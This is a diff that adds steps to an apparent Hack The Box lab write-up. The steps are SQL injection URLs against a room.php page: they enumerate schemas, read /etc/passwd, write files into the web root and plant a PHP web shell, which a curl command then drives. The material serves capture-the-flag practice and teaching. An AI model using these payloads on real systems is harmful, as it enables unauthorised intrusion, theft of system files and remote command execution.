@@ -53,10 +53,25 @@ http://10.10.10.143/room.php?cod=-2%20UNION%20SELECT%20@@version,2,3,4,5,6,7
 ![image](https://github.com/regarmulia/HTB/assets/33616880/d80371a3-ed4b-47d9-affa-b27701b9a6e0)
 
 
+```
+http://10.10.10.143/room.php?cod=-2%20UNION%20SELECT%201,2,gRoUp_cOncaT(0x7c,schema_name,0x7c),4,5,6,7%20fRoM%20information_schema.schemata
+http://10.10.10.143/room.php?cod=-2%20UNION%20SELECT%201,load_file(%27/etc/passwd%27),3,4,5,6,7
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/1c55adc4-ecb8-406c-96cd-15128c20c4ba)
 
 
+```
+http://10.10.10.143/room.php?cod=-2%20UNION%20SELECT%201,load_file(%27/etc/passwd%27),3,4,5,6,7%20into%20outfile%20%27/var/www/html/hacked.txt%27
+http://10.10.10.143/hacked.txt
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/35d70a8f-2890-487a-a5a3-fc324b50d5e8)
 
 
+```
+http://10.10.10.143/room.php?cod=-2%20UNION%20SELECT%201,%27%3C?php%20system($_REQUEST[%22exec%22]);?%3E%27,3,4,5,6,7%20into%20outfile%20%27/var/www/html/pwned.php%27
+curl -X POST http://10.10.10.143/pwned.php --data-urlencode 'exec=whoami'
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/726e93c7-7eaa-4d83-9219-6744746e6189)
 
 
 
